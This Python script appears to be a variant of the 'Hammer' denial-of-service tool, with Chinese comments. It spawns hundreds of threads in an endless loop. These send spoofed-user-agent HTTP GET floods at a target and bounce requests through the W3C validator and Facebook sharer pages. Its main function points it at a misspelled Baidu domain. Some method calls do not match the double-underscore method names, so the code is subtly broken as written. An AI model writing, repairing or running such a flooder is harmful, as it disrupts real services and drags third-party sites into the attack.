# beloved/DHS
import time,sys,socket,threading,logging,urllib.request,random

class Hammer(object):
    def __init__(self,url,port=80,thr=135):
        self.socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.url=url
        self.port=port
        self.thr=thr
        self.user_agent()
        self.my_bots()


    def __user_agent(self):
        uagent = []
        uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
        uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
        uagent.append(
            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
        uagent.append(
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
        uagent.append(
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
        uagent.append(
            "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
        uagent.append(
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
        self.uagent = uagent

    def __my_bots(self):
        bots = []
        bots.append("http://validator.w3.org/check?uri=")
        bots.append("http://www.facebook.com/sharer/sharer.php?u=")
        self.bots=bots

    def start(self):
        headers = open("headers.txt", "r")
        self.data = headers.read()
        headers.close()
        while True:
            # thr为开启线程数量，默认值１３５
            for i in range(int(self.thr)):
                # 开线程执行dos和dos2两个方法
                t = threading.Thread(target=self.dos)
                t.daemon = True  # if thread is exist, it dies
                t.start()
                t2 = threading.Thread(target=self.dos2)
                t2.daemon = True  # if thread is exist, it dies
                t2.start()
    def __dos(self):
        try:
            while True:
                packet = str("GET / HTTP/1.1\nHost: " + self.url + "\n\n User-Agent: " + random.choice(
                    self.uagent) + "\n" + self.data).encode('utf-8')
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.url, int(self.port)))
                if s.sendto(packet, (self.url, int(self.port))):
                    s.shutdown(1)
                    print("\033[92m", time.ctime(time.time()),
                          "\033[0m \033[94m <--packet sent! hammering--> \033[0m")
                else:
                    s.shutdown(1)
                    print("\033[91mshut<->down\033[0m")
                time.sleep(.1)
        except socket.error as e:
            print("\033[91mno connection! server maybe down\033[0m")
            # print("\033[91m",e,"\033[0m")
            time.sleep(.1)

    def __dos2(self):
        while True:
            self.bot_hammering(random.choice(self.bots) + "http://" + self.url)

    def __bot_hammering(self,url):
        try:
            while True:
                req = urllib.request.urlopen(
                    urllib.request.Request(url, headers={'User-Agent': random.choice(self.uagent)}))
                print("\033[94mbot is hammering...\033[0m")
                time.sleep(.1)
        except:
            time.sleep(.1)

def main():
    hammer=Hammer("wwww.baidu.com")
    hammer.start()

if __name__=="__main__":
    main()